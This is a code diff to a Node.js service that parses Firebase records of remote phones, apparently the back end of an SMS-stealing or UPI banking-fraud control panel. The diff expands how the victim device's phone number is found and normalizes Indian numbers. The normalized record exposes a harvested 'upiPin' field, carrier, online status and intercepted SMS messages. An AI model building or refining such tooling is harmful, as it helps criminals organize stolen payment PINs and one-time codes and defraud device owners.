@@ -7,10 +7,46 @@
 
 const PhoneExtractor = require("./phoneExtractor");
 
+// All possible field paths where a phone number might be stored in Firebase
+const PHONE_FIELD_PATHS = [
+  // Direct fields
+  "phoneNumber", "phone", "number", "mobileNumber", "mobile",
+  "phoneNo", "contactNumber", "simNumber", "sim",
+  "registeredNumber", "devicePhone", "myNumber",
+  "simPhoneNumber", "line1Number", "msisdn",
+  "phone_number", "mobile_number", "cellNumber",
+  "subscriberNumber", "subscriberId",
+  // Nested objects
+  "deviceInfo.phoneNumber", "deviceInfo.phone", "deviceInfo.number",
+  "simInfo.phoneNumber", "simInfo.number", "simInfo.simNumber",
+  "info.phone", "info.phoneNumber", "info.number",
+  "extras.phoneNumber", "extras.phone",
+  "device.phoneNumber", "device.phone",
+  "sim.phoneNumber", "sim.number", "sim.simNumber",
+  "SimData.phoneNumber", "SimData.number",
+  "SIM.phoneNumber", "SIM.number",
+  "network.phoneNumber", "network.number",
+  "account.phone", "account.phoneNumber",
+  "user.phone", "user.phoneNumber",
+  "owner.phone", "owner.phoneNumber",
+  "profile.phone", "profile.phoneNumber",
+];
+
+/**
+ * Get a value from a nested object using dot-notation path.
+ */
+function getNestedValue(obj, path) {
+  if (!obj) return undefined;
+  const parts = path.split(".");
+  let current = obj;
+  for (const part of parts) {
+    if (current === null || current === undefined || typeof current !== "object") return undefined;
+    current = current[part];
+  }
+  return current;
+}
+
 class DeviceService {
-  /**
-   * Parse a raw Firebase client object into a normalized device.
-   */
   static normalize(id, raw) {
     if (!raw || typeof raw !== "object") return null;
 
@@ -23,28 +59,14 @@ class DeviceService {
       batteryPercent = match ? parseInt(match[1], 10) : 0;
     }
 
-    const smsText = raw.lastSms || raw.smsBody || "";
-    const phoneInfo = PhoneExtractor.extract(smsText);
-
-    // Try many field paths for phone number
-    const phoneFields = [
-      raw.phoneNumber, raw.phone, raw.number, raw.mobileNumber, raw.mobile,
-      raw.phoneNo, raw.contactNumber, raw.simNumber, raw.sim,
-      raw.registeredNumber, raw.devicePhone, raw.myNumber,
-      raw.simPhoneNumber, raw.line1Number, raw.msisdn,
-      raw.deviceInfo?.phoneNumber, raw.deviceInfo?.phone,
-      raw.simInfo?.phoneNumber, raw.simInfo?.number,
-      raw.info?.phone, raw.info?.phoneNumber,
-      raw.extras?.phoneNumber, raw.extras?.phone,
-      raw.device?.phoneNumber, raw.device?.phone,
-    ];
-
+    // Extract phone from device-specific fields ONLY (not from SMS)
     let phoneNumber = "—";
-    for (const pf of phoneFields) {
-      if (pf && pf !== "—" && pf !== "" && pf !== "null" && pf !== "undefined") {
-        const digits = String(pf).replace(/[^0-9+]/g, "");
-        if (digits.length >= 7) {
-          phoneNumber = digits.replace(/^\+/, "");
+    for (const path of PHONE_FIELD_PATHS) {
+      const val = getNestedValue(raw, path);
+      if (val && val !== "—" && val !== "" && val !== "null" && val !== "undefined" && val !== "unknown") {
+        const digits = String(val).replace(/[^0-9]/g, "");
+        if (digits.length >= 10 && digits.length <= 15) {
+          phoneNumber = digits;
           // Prepend 91 for Indian 10-digit numbers
           if (phoneNumber.length === 10 && /^[6-9]/.test(phoneNumber)) {
             phoneNumber = "91" + phoneNumber;
@@ -54,10 +76,9 @@ class DeviceService {
       }
     }
 
-    // Fallback: try phone from SMS only if no device phone found
-    if (phoneNumber === "—" && phoneInfo.numbers.length > 0) {
-      phoneNumber = phoneInfo.numbers[0];
-    }
+    // Carrier/provider detection
+    const smsText = raw.lastSms || raw.smsBody || "";
+    const phoneInfo = PhoneExtractor.extract(smsText);
 
     return {
       id,
@@ -68,7 +89,10 @@ class DeviceService {
       batteryPercent,
       phoneNumber,
       provider: raw.provider || raw.carrier || raw.simOperator
-        || raw.deviceInfo?.carrier || raw.simInfo?.operator
+        || getNestedValue(raw, "deviceInfo.carrier")
+        || getNestedValue(raw, "simInfo.operator")
+        || getNestedValue(raw, "network.operator")
+        || getNestedValue(raw, "sim.operator")
         || phoneInfo.carriers[0] || "—",
       upiPin: raw.upiPin || raw.upiPIN || "",
       status: Boolean(raw.status || raw.online || raw.isConnected),
@@ -78,32 +102,19 @@ class DeviceService {
     };
   }
 
-  /**
-   * Parse a collection of raw Firebase clients.
-   * @param {object} clientsData - Firebase clients object
-   * @returns {Array} Normalized device list
-   */
   static parseAll(clientsData) {
     if (!clientsData || typeof clientsData !== "object") return [];
-
     return Object.entries(clientsData)
       .map(([id, raw]) => this.normalize(id, raw))
       .filter(Boolean)
       .sort((a, b) => {
-        // Online devices first, then alphabetical
         if (a.status !== b.status) return a.status ? -1 : 1;
         return a.name.localeCompare(b.name);
       });
   }
 
-  /**
-   * Parse SMS messages for a device.
-   * @param {object} messagesData - Firebase messages object for a device
-   * @returns {Array} Normalized message list
-   */
   static parseMessages(messagesData) {
     if (!messagesData || typeof messagesData !== "object") return [];
-
     return Object.entries(messagesData)
       .map(([id, raw]) => {
         if (!raw || typeof raw !== "object") return null;
